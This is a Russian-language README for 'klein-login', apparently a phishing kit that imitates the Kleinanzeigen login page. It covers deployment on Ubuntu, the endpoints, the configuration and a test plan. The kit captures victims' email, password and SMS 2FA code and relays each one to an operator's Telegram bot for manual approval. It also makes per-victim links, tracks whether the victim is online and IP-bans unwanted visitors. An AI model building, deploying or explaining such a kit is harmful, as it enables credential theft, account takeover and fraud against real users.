# klein-login

Отдельный проект: **логин (email + пароль) → 2FA** с ручным подтверждением в Telegram.

Старый проект в корне `klein/` (только 2FA) **не изменяется**.

## Быстрый деплой на Ubuntu (Docker)

```bash
cd klein-login
bash install.sh
```

Скрипт поставит Docker, спросит домен / токен бота / chat_id, поднимет HTTPS и проставит webhook.  
Полный тутор: **[DEPLOY.md](DEPLOY.md)**

## Flow

1. Пользователь открывает `/?id=<link_id>`
2. Страница логина → submit → уведомление в Telegram (✅ Верно / ❌ Неверно)
3. После ✅ → страница 2FA (SMS-код, как в старом проекте)
4. Код → уведомление в Telegram (✅ Код верный / ❌ Неверный)
5. Heartbeat каждые ~12 сек → кнопка **🟢 Онлайн** в боте

## Структура

```
klein-login/
├── index.php           # роутер: login / 2FA / 404
├── config/config.php   # БД, домен, бот
├── db/schema.sql       # links, sessions, login_attempts, attempts, …
├── api/
│   ├── login.php
│   ├── login-status.php
│   ├── verify.php
│   ├── status.php
│   ├── presence.php
│   └── webhook.php
├── lib/                # db, session, bot, telegram, config_store
└── assets/             # login.css, login.js, app.css, main.js, presence.js
```

## Деплой

### 1. MySQL

Создайте отдельную БД, например `kleinanzeigen_login`.

### 2. Конфиг

Отредактируйте [`config/config.php`](config/config.php):

| Параметр | Описание |
|----------|----------|
| `db.*` | Подключение к новой БД |
| `base_url` | Публичный URL без слэша на конце |
| `telegram.token` | Токен **нового** бота от @BotFather |
| `telegram.webhook_secret` | Случайная строка для защиты webhook |
| `telegram.super_admins` | Массив chat_id суперадминов |

### 3. Загрузка на сервер

Разместите папку `klein-login/` на отдельном vhost или подпапке. Убедитесь, что PHP 8+ и расширения `pdo_mysql`, `curl` включены.

### 4. Установка

```bash
# CLI
php setup.php

# или браузер
https://ваш-домен/setup.php?token=<webhook_secret>
```

`setup.php` создаёт таблицы, регистрирует суперадминов и ставит webhook.

**После успешной установки удалите или закройте `setup.php`.**

### 5. Telegram-бот

1. Создайте бота через @BotFather
2. Отправьте `/start` — вы будете зарегистрированы как суперадмин (если chat_id в конфиге)
3. `/newlink 1234` — создать ссылку (суффикс = последние цифры телефона на 2FA)
4. Ссылка: `https://ваш-домен/?id=xxx`

## API

| Endpoint | Метод | Назначение |
|----------|-------|------------|
| `/api/login.php` | POST | email + password → attempt → бот |
| `/api/login-status.php` | GET | polling статуса логина |
| `/api/verify.php` | POST | отправка 2FA-кода |
| `/api/status.php` | GET | polling статуса 2FA |
| `/api/presence.php` | POST | heartbeat (cookie `ka_sid`) |
| `/api/webhook.php` | POST | Telegram webhook |

## Настройка текстов

Через бота: **⚙️ Настройки** → категория **🔐 Страница логина** или **📝 Главный экран (2FA)**.

Ключи логина: `login_title`, `login_subtitle`, `login_button`, `login_forgot`, `login_register`, `login_error`, `login_email_label`, `login_password_label`, `login_edit_link`.

## Тест-план

- [ ] `setup.php` — схема и webhook без ошибок
- [ ] `/newlink` — ссылка создаётся
- [ ] Открыть `/?id=xxx` — страница логина
- [ ] Email → Bearbeiten → пароль → Einloggen — уведомление в Telegram
- [ ] ❌ Неверно — красная ошибка на логине
- [ ] ✅ Верно — переход на 2FA
- [ ] Код 2FA — уведомление, approve/reject
- [ ] Кнопка 🟢 Онлайн — статус при активной вкладке
- [ ] 🚫 Забанить IP — 404 на странице
- [ ] Без approve логина — `verify.php` возвращает 403

## Безопасность

- Webhook secret (`X-Telegram-Bot-Api-Secret-Token`)
- IP ban (404 на странице, silent reject в API)
- Cookie `ka_sid` HttpOnly — 2FA только после approved login
- `.htaccess` блокирует `config/`, `lib/`, `db/`
